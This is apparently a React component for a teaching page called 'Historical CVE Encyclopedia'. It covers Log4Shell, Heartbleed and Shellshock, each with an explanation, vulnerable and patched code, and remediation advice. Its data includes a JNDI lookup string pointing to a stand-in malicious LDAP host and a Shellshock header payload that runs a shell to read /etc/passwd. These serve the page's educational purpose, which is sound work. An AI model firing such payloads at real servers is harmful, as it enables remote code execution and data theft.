import { useState } from "react";
import { 
  BookOpen, 
  Search, 
  AlertTriangle, 
  Code2, 
  CheckCircle2, 
  Info,
  Calendar,
  Layers,
  ChevronRight,
  ShieldCheck
} from "lucide-react";
import { HistoricalCve } from "../types";

const CVE_DATABASE: HistoricalCve[] = [
  {
    id: "log4shell",
    cveId: "CVE-2021-44228",
    title: "Log4Shell (Remote Code Execution)",
    year: 2021,
    cvss: 10.0,
    description: "A critical remote code execution (RCE) vulnerability in Apache Log4j2 (a widely used Java logging library). Attackers can trigger arbitrary code execution by submitting a specially crafted string containing JNDI references (e.g., in a User-Agent header or search query).",
    explanation: "Log4j allowed logs to perform dynamic string lookups using the Java Naming and Directory Interface (JNDI). When Log4j parsed a log input containing '${jndi:ldap://malicious-host.com/payload}', it queried the malicious LDAP directory and downloaded/executed the compiled Java class file, achieving full system compromise.",
    vulnerableCode: `// Vulnerable Code: Directly logging unvalidated user input
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoginServlet {
    private static final Logger logger = LogManager.getLogger(LoginServlet.class);

    public void doPost(HttpServletRequest request, HttpServletResponse response) {
        String userAgent = request.getHeader("User-Agent");
        // ❌ Vulnerable: logger automatically processes lookup directives
        logger.info("Login attempt received from User-Agent: " + userAgent);
    }
}`,
    patchedCode: `// Secure Code: Parameterized logging & updated library configuration
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoginServlet {
    private static final Logger logger = LogManager.getLogger(LoginServlet.class);

    public void doPost(HttpServletRequest request, HttpServletResponse response) {
        String userAgent = request.getHeader("User-Agent");
        
        // ✅ Patch 1: Upgrade Log4j to version >= 2.15.0 which disables JNDI lookups by default
        // ✅ Patch 2: Sanitize / remove lookup tokens or enforce strict lookup domains
        logger.info("Login attempt received from User-Agent: {}", userAgent);
        
        // Or set system property: log4j2.formatMsgNoLookups=true
    }
}`,
    remediation: "Upgrade Apache Log4j to version 2.15.0 or higher. Alternatively, configure the environment variable 'LOG4J_FORMAT_MSG_NO_LOOKUPS=true' to disable message formatting lookups entirely."
  },
  {
    id: "heartbleed",
    cveId: "CVE-2014-0160",
    title: "Heartbleed (OpenSSL Memory Disclosure)",
    year: 2014,
    cvss: 7.5,
    description: "A severe software bug in the OpenSSL cryptography library. It allows attackers to read the memory of target servers, exposing sensitive database contents, user credentials, and private SSL/TLS cryptographic keys.",
    explanation: "The OpenSSL TLS Heartbeat implementation failed to validate the payload length field submitted in HeartbeatRequest packets. An attacker could request a 1-byte payload but declare the payload length as 65,535 bytes. OpenSSL would then copy 65,535 bytes of its active RAM buffer back to the attacker, leaking sensitive adjacent server data.",
    vulnerableCode: `/* Vulnerable C implementation in OpenSSL heartbeat */
unsigned int payload;
unsigned int padding = 16; /* minimum padding */

/* ❌ Read length from untrusted incoming packet structure */
n2s(p, payload); 
pl = p; // pointer to payload text

/* ❌ Allocates buffer using unchecked 'payload' length value */
unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload + padding);
bp = buffer;

/* ❌ Copies 'payload' bytes of RAM without verifying actual request size */
memcpy(bp, pl, payload);`,
    patchedCode: `/* Secure OpenSSL patch correcting length checks */
unsigned int payload;
unsigned int padding = 16;

/* Read length from incoming packet structure */
n2s(p, payload);

/* ✅ Patch: Ensure incoming packet length matches actual payload size */
if (1 + 2 + payload + 16 > s->s3->rrec.length) {
    /* Reject request silently - malicious length mismatch detected */
    return 0; 
}

pl = p;
unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload + padding);
bp = buffer;

/* Safe copy now that payload size is validated */
memcpy(bp, pl, payload);`,
    remediation: "Upgrade OpenSSL to patched versions (1.0.1g or later). Regenerate compromised SSL certificates and revoke old private keys immediately."
  },
  {
    id: "shellshock",
    cveId: "CVE-2014-6271",
    title: "Shellshock (Bash Arbitrary Command Execution)",
    year: 2014,
    cvss: 9.8,
    description: "A vulnerability in the GNU Bash shell allowing remote attackers to execute arbitrary system commands via crafted environment variables. This is heavily exploited in Apache web servers running CGI scripts.",
    explanation: "Bash allowed users to define custom functions inside environment variables. However, the parser failed to stop reading when it reached the end of the function definition, executing any subsequent shell commands appended to the variable definition.",
    vulnerableCode: `# Vulnerable environment variable payload sent to server CGI script
HTTP_USER_AGENT='() { :;}; echo "Vulnerable Command Executed"; /bin/sh -c "cat /etc/passwd"'

# ❌ When CGI shell spawned, Bash evaluated the function () { :;}; 
# and carried on executing the appended command /bin/sh -c ...`,
    patchedCode: `# Secure Patch applied to GNU Bash source code
# The Bash environment parser was updated to isolate imported functions.
# Appended commands following a function definition are now strictly rejected.

# ✅ Verify Bash is secure:
# Run: env x='() { :;}; echo vulnerable' bash -c "echo test"
# Secure Bash will print:
# bash: warning: x: ignoring function definition attempt
# test`,
    remediation: "Upgrade Bash to the latest system package (e.g. run 'sudo apt update && sudo apt upgrade bash'). Audit web servers to ensure CGI script privileges are locked down."
  }
];

export default function CveLibrary() {
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [selectedCveId, setSelectedCveId] = useState<string>("log4shell");

  const filteredCves = CVE_DATABASE.filter(cve => 
    cve.cveId.toLowerCase().includes(searchQuery.toLowerCase()) ||
    cve.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
    cve.description.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const activeCve = CVE_DATABASE.find(c => c.id === selectedCveId) || CVE_DATABASE[0];

  return (
    <div id="cve-encyclopedia" className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl space-y-6">
      
      {/* Header */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-5">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-indigo-500/10 rounded-lg">
            <BookOpen className="w-5 h-5 text-indigo-400" />
          </div>
          <div>
            <h2 className="text-xl font-bold tracking-tight text-white">Historical CVE Encyclopedia</h2>
            <p className="text-xs text-slate-400">Deep-dive into famous security vulnerabilities, vulnerable source files, and patches</p>
          </div>
        </div>

        {/* Search Bar */}
        <div className="relative w-full md:w-72">
          <Search className="w-4 h-4 text-slate-500 absolute left-3 top-2.5" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search CVE ID or name..."
            className="w-full bg-slate-950 text-slate-200 text-xs pl-9 pr-4 py-2 border border-slate-800 focus:border-indigo-500 rounded-lg outline-none font-mono"
          />
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        
        {/* Left column: List of CVEs */}
        <div className="lg:col-span-4 space-y-2">
          <div className="text-[10px] font-mono uppercase tracking-wider text-slate-500 mb-1 font-bold">
            Public Vulnerability Catalogue
          </div>
          <div className="space-y-2 max-h-[380px] overflow-y-auto pr-1">
            {filteredCves.length === 0 ? (
              <div className="text-center py-8 text-slate-500 text-xs italic">
                No matching vulnerabilities found
              </div>
            ) : (
              filteredCves.map((cve) => (
                <button
                  key={cve.id}
                  onClick={() => setSelectedCveId(cve.id)}
                  className={`w-full text-left p-3.5 rounded-xl border flex justify-between items-center transition cursor-pointer ${
                    selectedCveId === cve.id
                      ? "bg-slate-950 border-indigo-500/80 text-white shadow-md shadow-indigo-950/15"
                      : "bg-slate-950/40 border-slate-850/60 text-slate-400 hover:text-slate-200 hover:bg-slate-950/80"
                  }`}
                >
                  <div className="space-y-1 pr-2 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-[10px] font-bold text-indigo-400 bg-indigo-500/10 px-1.5 py-0.5 rounded">
                        {cve.cveId}
                      </span>
                      <span className={`text-[10px] font-mono px-1 py-0.5 rounded font-bold ${
                        cve.cvss >= 9.0 ? "bg-red-500/10 text-red-400" : "bg-orange-500/10 text-orange-400"
                      }`}>
                        CVSS {cve.cvss}
                      </span>
                    </div>
                    <div className="font-bold text-xs truncate text-slate-200">{cve.title}</div>
                  </div>
                  <ChevronRight className={`w-4 h-4 shrink-0 ${selectedCveId === cve.id ? "text-indigo-400" : "text-slate-600"}`} />
                </button>
              ))
            )}
          </div>
        </div>

        {/* Right column: In-depth technical breakdown */}
        <div className="lg:col-span-8 bg-slate-950 rounded-xl p-5 border border-slate-850 space-y-5">
          
          {/* Header metadata */}
          <div className="flex flex-wrap justify-between items-start gap-4 border-b border-slate-850 pb-4">
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-base font-bold text-white">{activeCve.title}</h3>
                <span className="text-xs text-slate-500 font-mono font-bold">({activeCve.cveId})</span>
              </div>
              <p className="text-xs text-slate-400 mt-1">{activeCve.description}</p>
            </div>

            <div className="flex gap-2">
              <div className="bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-lg text-center font-mono">
                <div className="text-[8px] text-slate-500 uppercase tracking-wider">Disclosed</div>
                <div className="text-xs font-bold text-indigo-400 flex items-center gap-1">
                  <Calendar className="w-3.5 h-3.5 shrink-0 text-indigo-500" />
                  {activeCve.year}
                </div>
              </div>
              <div className="bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-lg text-center font-mono">
                <div className="text-[8px] text-slate-500 uppercase tracking-wider">Severity</div>
                <div className={`text-xs font-bold flex items-center gap-1 ${activeCve.cvss >= 9.0 ? "text-red-400" : "text-orange-400"}`}>
                  <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                  {activeCve.cvss >= 9.0 ? "CRITICAL" : "HIGH"}
                </div>
              </div>
            </div>
          </div>

          {/* Under the hood mechanism */}
          <div className="space-y-2">
            <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
              <Layers className="w-4 h-4 text-indigo-400" />
              Under the Hood: Root Cause Mechanism
            </h4>
            <p className="text-xs text-slate-300 leading-relaxed font-sans bg-slate-900/40 p-3.5 rounded-lg border border-slate-850/60">
              {activeCve.explanation}
            </p>
          </div>

          {/* Side by side code viewer */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            
            {/* Vulnerable Code block */}
            <div className="space-y-1.5">
              <div className="text-[10px] font-mono text-red-400 uppercase tracking-wider flex items-center gap-1 font-bold">
                <Code2 className="w-3.5 h-3.5 text-red-400" />
                Vulnerable Source Code
              </div>
              <div className="bg-slate-900 border border-red-950/40 p-3 rounded-lg overflow-x-auto max-h-[190px]">
                <pre className="text-[10px] font-mono text-slate-400 leading-normal select-all">
                  <code>{activeCve.vulnerableCode}</code>
                </pre>
              </div>
            </div>

            {/* Patched Code block */}
            <div className="space-y-1.5">
              <div className="text-[10px] font-mono text-emerald-400 uppercase tracking-wider flex items-center gap-1 font-bold">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                Remediated Secure Patch
              </div>
              <div className="bg-slate-900 border border-emerald-950/40 p-3 rounded-lg overflow-x-auto max-h-[190px]">
                <pre className="text-[10px] font-mono text-slate-400 leading-normal select-all">
                  <code>{activeCve.patchedCode}</code>
                </pre>
              </div>
            </div>

          </div>

          {/* Practical Mitigation advice */}
          <div className="bg-indigo-500/5 border border-indigo-950/60 p-4 rounded-xl flex items-start gap-3">
            <Info className="w-5 h-5 text-indigo-400 shrink-0 mt-0.5" />
            <div className="space-y-1">
              <div className="text-xs font-bold text-white uppercase tracking-wider">Enterprise Patch Guideline</div>
              <p className="text-xs text-slate-300 leading-normal">{activeCve.remediation}</p>
            </div>
          </div>

        </div>

      </div>

    </div>
  );
}
